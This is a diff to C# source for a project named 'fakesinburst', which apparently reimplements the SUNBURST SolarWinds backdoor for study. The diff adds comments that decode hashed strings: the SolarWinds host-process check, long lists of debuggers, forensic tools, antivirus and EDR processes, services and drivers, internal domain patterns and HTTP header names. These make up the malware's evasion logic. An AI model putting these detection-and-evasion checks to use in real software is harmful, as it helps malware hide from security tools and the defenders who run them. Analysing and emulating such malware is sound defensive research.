@@ -272,6 +272,7 @@ namespace fakesinburst
 			try
 			{
 				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Trying to get Current Process Name and compare to hash of 'solarwinds.businesslayerhost'.");
+				// solarwinds.businesslayerhost
 				if ((Program.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL) || bypassb)
 				{
 					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed sunburst running from 'solarwinds.businesslayerhost' ");
@@ -846,164 +847,317 @@ namespace fakesinburst
 		// Token: 0x04000024 RID: 36
 		private static readonly ulong[] assemblyTimeStamps = new ulong[]
 		{
+			// apimonitor-x64
 			2597124982561782591UL,
+			// apimonitor-x86
 			2600364143812063535UL,
+			// autopsy64
 			13464308873961738403UL,
+			// autopsy
 			4821863173800309721UL,
+			// autoruns64
 			12969190449276002545UL,
+			// autoruns
 			3320026265773918739UL,
+			// autorunsc64
 			12094027092655598256UL,
+			// autorunsc
 			10657751674541025650UL,
+			// binaryninja
 			11913842725949116895UL,
+			// blacklight
 			5449730069165757263UL,
+			// cff explorer
 			292198192373389586UL,
+			// cutter
 			12790084614253405985UL,
+			// de4dot
 			5219431737322569038UL,
+			// debugview
 			15535773470978271326UL,
+			// diskmon
 			7810436520414958497UL,
+			// dnsd
 			13316211011159594063UL,
+			// dnspy
 			13825071784440082496UL,
+			// dotpeek32
 			14480775929210717493UL,
+			// dotpeek64
 			14482658293117931546UL,
+			// dumpcap
 			8473756179280619170UL,
+			// evidence center
 			3778500091710709090UL,
+			// exeinfope
 			8799118153397725683UL,
+			// fakedns
 			12027963942392743532UL,
+			// fakenet
 			576626207276463000UL,
+			// ffdec
 			7412338704062093516UL,
+			// fiddler
 			682250828679635420UL,
+			// fileinsight
 			13014156621614176974UL,
+			// floss
 			18150909006539876521UL,
+			// gdb
 			10336842116636872171UL,
+			// hiew32demo
 			12785322942775634499UL,
+			// hiew32
 			13260224381505715848UL,
 			17956969551821596225UL,
+			// idaq64
 			8709004393777297355UL,
+			// idaq
 			14256853800858727521UL,
+			// idr
 			8129411991672431889UL,
+			// ildasm
 			15997665423159927228UL,
+			// ilspy
 			10829648878147112121UL,
+			// jd-gui
 			9149947745824492274UL,
+			// lordpe
 			3656637464651387014UL,
+			// officemalscanner
 			3575761800716667678UL,
+			// ollydbg
 			4501656691368064027UL,
+			// pdfstreamdumper
 			10296494671777307979UL,
+			// pe-bear
 			14630721578341374856UL,
+			// pebrowse64
 			4088976323439621041UL,
+			// peid
 			9531326785919727076UL,
+			// pe-sieve32
 			6461429591783621719UL,
+			// pe-sieve64
 			6508141243778577344UL,
+			// pestudio
 			10235971842993272939UL,
+			// peview
 			2478231962306073784UL,
+			// pexplorer
 			9903758755917170407UL,
+			// ppee
 			14710585101020280896UL,
+			// ppee
 			14710585101020280896UL,
+			// procdump64
 			13611814135072561278UL,
+			// procdump
 			2810460305047003196UL,
+			// processhacker
 			2032008861530788751UL,
+			// procexp64
 			27407921587843457UL,
+			// procexp
 			6491986958834001955UL,
+			// procmon
 			2128122064571842954UL,
+			// prodiscoverbasic
 			10484659978517092504UL,
+			// py2exedecompiler
 			8478833628889826985UL,
+			// r2agent
 			10463926208560207521UL,
+			// rabin2
 			7080175711202577138UL,
+			// radare2
 			8697424601205169055UL,
+			// ramcapture64
 			7775177810774851294UL,
+			// ramcapture
 			16130138450758310172UL,
+			// reflector
 			506634811745884560UL,
+			// regmon
 			18294908219222222902UL,
+			// resourcehacker
 			3588624367609827560UL,
+			// retdec-ar-extractor
 			9555688264681862794UL,
+			// retdec-bin2llvmir
 			5415426428750045503UL,
+			// retdec-bin2pat
 			3642525650883269872UL,
+			// retdec-config
 			13135068273077306806UL,
+			// retdec-fileinfo
 			3769837838875367802UL,
+			// retdec-getsig
 			191060519014405309UL,
+			// retdec-idr2pat
 			1682585410644922036UL,
+			// retdec-llvmir2hll
 			7878537243757499832UL,
+			// retdec-macho-extractor
 			13799353263187722717UL,
+			// retdec-pat2yara
 			1367627386496056834UL,
+			// retdec-stacofin
 			12574535824074203265UL,
+			// retdec-unpacker
 			16990567851129491937UL,
+			// retdec-yarac
 			8994091295115840290UL,
+			// rundotnetdll
 			13876356431472225791UL,
+			// sbiesvc
 			14968320160131875803UL,
+			// scdbg
 			14868920869169964081UL,
+			// scylla_x64
 			106672141413120087UL,
+			// scylla_x86
 			79089792725215063UL,
+			// shellcode_launcher
 			5614586596107908838UL,
+			// solarwindsdiagnostics
 			3869935012404164040UL,
+			// sysmon64
 			3538022140597504361UL,
+			// sysmon
 			14111374107076822891UL,
+			// task explorer
 			7982848972385914508UL,
+			// task explorer-64
 			8760312338504300643UL,
+			// tcpdump
 			17351543633914244545UL,
+			// tcpvcon
 			7516148236133302073UL,
+			// tcpview
 			15114163911481793350UL,
+			// vboxservice
 			15457732070353984570UL,
+			// win32_remote
 			16292685861617888592UL,
+			// win64_remotex64
 			10374841591685794123UL,
+			// windbg
 			3045986759481489935UL,
+			// windump
 			17109238199226571972UL,
+			// winhex64
 			6827032273910657891UL,
+			// winhex
 			5945487981219695001UL,
+			// winobj
 			8052533790968282297UL,
+			// wireshark
 			17574002783607647274UL,
+			// x32dbg
 			3341747963119755850UL,
+			// x64dbg
 			14193859431895170587UL,
+			// xwforensics64
 			17439059603042731363UL,
+			// xwforensics
 			17683972236092287897UL,
+			// redcloak
 			700598796416086955UL,
+			// avgsvc
 			3660705254426876796UL,
+			// avgui
 			12709986806548166638UL,
+			// avgsvca
 			3890794756780010537UL,
+			// avgidsagent
 			2797129108883749491UL,
+			// avgsvcx
 			3890769468012566366UL,
+			// avgwdsvcx
 			14095938998438966337UL,
+			// avgadminclientservice
 			11109294216876344399UL,
+			// afwserv
 			1368907909245890092UL,
+			// avastui
 			11818825521849580123UL,
+			// avastsvc
 			8146185202538899243UL,
+			// aswidsagent
 			2934149816356927366UL,
+			// aswidsagenta
 			13029357933491444455UL,
+			// aswengsrv
 			6195833633417633900UL,
+			// avastavwrapper
 			2760663353550280147UL,
+			// bccavsvc
 			16423314183614230717UL,
+			// psanhost
 			2532538262737333146UL,
+			// psuaservice
 			4454255944391929578UL,
+			// psuamain
 			6088115528707848728UL,
+			// avp
 			13611051401579634621UL,
+			// avpui
 			18147627057830191163UL,
+			// ksde
 			17633734304611248415UL,
+			// ksdeui
 			13581776705111912829UL,
+			// tanium
 			7175363135479931834UL,
+			// taniumclient
 			3178468437029279937UL,
+			// taniumdetectengine
 			13599785766252827703UL,
+			// taniumendpointindex
 			6180361713414290679UL,
+			// taniumtracecli
 			8612208440357175863UL,
+			// taniumtracewebsocketclient64
 			8408095252303317471UL
 		};
 
 		// Token: 0x04000025 RID: 37
 		private static readonly ulong[] configTimeStamps = new ulong[]
 		{
+			// cybkerneltracker.sys
 			17097380490166623672UL,
+			// atrsdfw.sys
 			15194901817027173566UL,
+			// eaw.sys
 			12718416789200275332UL,
+			// rvsavd.sys
 			18392881921099771407UL,
+			// dgdmk.sys
 			3626142665768487764UL,
+			// sentinelmonitor.sys
 			12343334044036541897UL,
+			// hexisfsmonitor.sys
 			397780960855462669UL,
+			// groundling32.sys
 			6943102301517884811UL,
+			// groundling64.sys
 			13544031715334011032UL,
+			// safe-agent.sys
 			11801746708619571308UL,
+			// crexecprev.sys
 			18159703063075866524UL,
+			// psepfilter.sys
 			835151375515278827UL,
+			// cve.sys
 			16570804352575357627UL,
+			// brfilter.sys
 			1614465773938842903UL,
+			// brcow_x_x_x_x.sys
 			12679195163651834776UL,
+			// lragentmf.sys
 			2717025511528702475UL,
+			// libwamf.sys
 			17984632978012874803UL
 		};
 
@@ -1023,12 +1177,14 @@ namespace fakesinburst
 			{
 				timeStamps = new ulong[]
 				{
+					// msmpeng
 					5183687599225757871UL
 				},
 				Svc = new Program.ServiceConfiguration.Service[]
 				{
 					new Program.ServiceConfiguration.Service
 					{
+						// windefend
 						timeStamp = 917638920165491138UL,
 						started = true
 					}
@@ -1038,12 +1194,14 @@ namespace fakesinburst
 			{
 				timeStamps = new ulong[]
 				{
+					// mssense
 					10063651499895178962UL
 				},
 				Svc = new Program.ServiceConfiguration.Service[]
 				{
 					new Program.ServiceConfiguration.Service
 					{
+						// sense
 						timeStamp = 16335643316870329598UL,
 						started = true
 					}
@@ -1062,28 +1220,34 @@ namespace fakesinburst
 			{
 				timeStamps = new ulong[]
 				{
+					// cavp
 					17204844226884380288UL,
+					// cb
 					5984963105389676759UL
 				},
 				Svc = new Program.ServiceConfiguration.Service[]
 				{
 					new Program.ServiceConfiguration.Service
 					{
+						// carbonblack
 						timeStamp = 11385275378891906608UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// carbonblackk
 						timeStamp = 13693525876560827283UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// cbcomms
 						timeStamp = 17849680105131524334UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// cbstream
 						timeStamp = 18246404330670877335UL,
 						DefaultValue = 3U
 					}
@@ -1093,23 +1257,28 @@ namespace fakesinburst
 			{
 				timeStamps = new ulong[]
 				{
+					// csfalconservice
 					8698326794961817906UL,
+					// csfalconcontainer
 					9061219083560670602UL
 				},
 				Svc = new Program.ServiceConfiguration.Service[]
 				{
 					new Program.ServiceConfiguration.Service
 					{
+						// csagent
 						timeStamp = 11771945869106552231UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// csdevicecontrol
 						timeStamp = 9234894663364701749UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// csfalconservice
 						timeStamp = 8698326794961817906UL,
 						DefaultValue = 2U
 					}
@@ -1119,33 +1288,40 @@ namespace fakesinburst
 			{
 				timeStamps = new ulong[]
 				{
+					// xagt
 					15695338751700748390UL,
+					// xagtnotif
 					640589622539783622UL
 				},
 				Svc = new Program.ServiceConfiguration.Service[]
 				{
 					new Program.ServiceConfiguration.Service
 					{
+						// xagt
 						timeStamp = 15695338751700748390UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fe_avk
 						timeStamp = 9384605490088500348UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fekern
 						timeStamp = 6274014997237900919UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// feelam
 						timeStamp = 15092207615430402812UL,
 						DefaultValue = 0U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fewscservice
 						timeStamp = 3320767229281015341UL,
 						DefaultValue = 3U
 					}
@@ -1155,49 +1331,60 @@ namespace fakesinburst
 			{
 				timeStamps = new ulong[]
 				{
+					// ekrn
 					3200333496547938354UL,
+					// eguiproxy
 					14513577387099045298UL,
+					// egui
 					607197993339007484UL
 				},
 				Svc = new Program.ServiceConfiguration.Service[]
 				{
 					new Program.ServiceConfiguration.Service
 					{
+						// eamonm
 						timeStamp = 15587050164583443069UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// eelam
 						timeStamp = 9559632696372799208UL,
 						DefaultValue = 0U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// ehdrv
 						timeStamp = 4931721628717906635UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// ekrn
 						timeStamp = 3200333496547938354UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// ekrnepfw
 						timeStamp = 2589926981877829912UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// epfwwfp
 						timeStamp = 17997967489723066537UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// ekbdflt
 						timeStamp = 14079676299181301772UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// epfw
 						timeStamp = 17939405613729073960UL,
 						DefaultValue = 1U
 					}
@@ -1207,25 +1394,36 @@ namespace fakesinburst
 			{
 				timeStamps = new ulong[]
 				{
+					// fsgk32st
 					521157249538507889UL,
+					// fswebuid
 					14971809093655817917UL,
+					// fsgk32
 					10545868833523019926UL,
+					// fsma32
 					15039834196857999838UL,
+					// fssm32
 					14055243717250701608UL,
+					// fnrb32
 					5587557070429522647UL,
+					// fsaua
 					12445177985737237804UL,
+					// fsorsp
 					17978774977754553159UL,
+					// fsav32
 					17017923349298346219UL
 				},
 				Svc = new Program.ServiceConfiguration.Service[]
 				{
 					new Program.ServiceConfiguration.Service
 					{
+						// f-secure gatekeeper handler starter
 						timeStamp = 17624147599670377042UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// f-secure network request broker
 						timeStamp = 16066651430762394116UL,
 						DefaultValue = 3U
 					},
@@ -1236,81 +1434,97 @@ namespace fakesinburst
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsaua
 						timeStamp = 12445177985737237804UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsma
 						timeStamp = 3421213182954201407UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsorspclient
 						timeStamp = 14243671177281069512UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// f-secure gatekeeper
 						timeStamp = 16112751343173365533UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// f-secure hips
 						timeStamp = 3425260965299690882UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsbts
 						timeStamp = 9333057603143916814UL,
 						DefaultValue = 0U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsni
 						timeStamp = 3413886037471417852UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsvista
 						timeStamp = 7315838824213522000UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// f-secure filter
 						timeStamp = 13783346438774742614UL,
 						DefaultValue = 4U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// f-secure recognizer
 						timeStamp = 2380224015317016190UL,
 						DefaultValue = 4U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fses
 						timeStamp = 3413052607651207697UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsfw
 						timeStamp = 3407972863931386250UL,
 						DefaultValue = 1U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsdfw
 						timeStamp = 10393903804869831898UL,
 						DefaultValue = 3U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsaus
 						timeStamp = 12445232961318634374UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsms
 						timeStamp = 3421197789791424393UL,
 						DefaultValue = 2U
 					},
 					new Program.ServiceConfiguration.Service
 					{
+						// fsdevcon
 						timeStamp = 541172992193764396UL,
 						DefaultValue = 2U
 					}
@@ -1385,18 +1599,31 @@ namespace fakesinburst
 		// Token: 0x0400002B RID: 43
 		private static readonly ulong[] patternHashes = new ulong[]
 		{
+			// swdev.local
 			1109067043404435916UL,
+			// swdev.dmz
 			15267980678929160412UL,
+			// lab.local
 			8381292265993977266UL,
+			// lab.na
 			3796405623695665524UL,
+			// emea.sales
 			8727477769544302060UL,
+			// cork.lab
 			10734127004244879770UL,
+			// dev.local
 			11073283311104541690UL,
+			// dmz.local
 			4030236413975199654UL,
+			// pci.local
 			7701683279824397773UL,
+			// saas.swi
 			5132256620104998637UL,
+			// lab.rio
 			5942282052525294911UL,
+			// lab.brno
 			4578480846255629462UL,
+			// apac.lab
 			16858955978146406642UL
 		};
 
@@ -2570,12 +2797,16 @@ namespace fakesinburst
 						else
 						{
 							ulong hash = Program.GetHash(text3.ToLower());
+							// expect
 							if (hash <= 8873858923435176895UL)
 							{
+								// content-type
 								if (hash <= 6116246686670134098UL)
 								{
+									// accept
 									if (hash != 2734787258623754862UL)
 									{
+										// content-type
 										if (hash == 6116246686670134098UL)
 										{
 											httpWebRequest.ContentType = text4;
@@ -2586,10 +2817,13 @@ namespace fakesinburst
 										httpWebRequest.Accept = text4;
 									}
 								}
+								// user-agent
 								else if (hash != 7574774749059321801UL)
 								{
+									// expect
 									if (hash == 8873858923435176895UL)
 									{
+										// 100-continue
 										if (Program.GetHash(text4.ToLower()) == 1475579823244607677UL)
 										{
 											httpWebRequest.ServicePoint.Expect100Continue = true;
@@ -2605,14 +2839,19 @@ namespace fakesinburst
 									httpWebRequest.UserAgent = text4;
 								}
 							}
+							// connection
 							else if (hash <= 11266044540366291518UL)
 							{
+								// referer
 								if (hash != 9007106680104765185UL)
 								{
+									// connection
 									if (hash == 11266044540366291518UL)
 									{
 										ulong hash2 = Program.GetHash(text4.ToLower());
+										// keep-alive
 										httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
+										// close
 										httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
 									}
 								}
@@ -2621,8 +2860,10 @@ namespace fakesinburst
 									httpWebRequest.Referer = text4;
 								}
 							}
+							// if-modified-since
 							else if (hash != 15514036435533858158UL)
 							{
+								// date
 								if (hash == 16066522799090129502UL)
 								{
 									httpWebRequest.Date = DateTime.Parse(text4);
